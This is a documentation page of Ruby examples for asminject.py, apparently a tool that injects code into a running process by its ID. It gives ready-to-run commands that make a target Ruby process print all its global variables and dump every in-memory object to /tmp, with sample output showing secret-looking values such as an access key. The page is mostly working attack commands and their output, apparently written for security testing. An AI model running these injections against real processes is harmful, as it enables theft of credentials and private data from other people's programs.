# asminject.py examples - Ruby
* [Write all global variables to standard out](#write-all-global-variables-to-standard-out)
* [Write a text representation of all objects in memory to disk](#write-a-text-representation-of-all-objects-in-memory-to-disk)

## Write all global variables to standard out

Use [the following Ruby code, which was borrowed from this Gist by Dmitry Yakimenko](https://gist.github.com/detunized/1620634)

```
global_variables.sort.each do |name|; puts "#{name}: #{eval "#{name}.inspect"}
```

e.g.

```
# python3 ./asminject.py 84955 execute_ruby_code.s --arch x86-64 \
   --relative-offsets-from-binaries \
   --stop-method "slow" \
   --var rubycode "global_variables.sort.each do |name|; puts \\\"#{name}: #{eval \\\"#{name}.inspect\\\"}\\\"; 
end
```

Example output:

```
2022-06-07T13:50:06-07:00 - Loop count 10
2022-06-07T13:50:11-07:00 - Loop count 11
$!: nil
...omitted for brevity...
$$: 84955
...omitted for brevity...
$0: "practice/ruby_loop.rb"
...omitted for brevity...
$example_global_var_1: "AKIASADF9370235SUAS0"
$example_global_var_2: "This value should not be disclosed"

```

## Write a text representation of all objects in memory to disk

Use the following Ruby code:

```
$obj_dump_counter = 0; ObjectSpace.each_object{|e| File.open("/tmp/rubydump-#{$obj_dump_counter}.dat", "wb") { |file| file.write(e); $obj_dump_counter += 1; }}
```

e.g.

```
python3 ./asminject.py 163017 execute_ruby_code.s --arch x86-64 \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var rubycode '$obj_dump_counter = 0; ObjectSpace.each_object{|e| File.open(\"/tmp/rubydump-#{$obj_dump_counter}.dat\", \"wb\") { |file| file.write(e); $obj_dump_counter += 1; }}'
```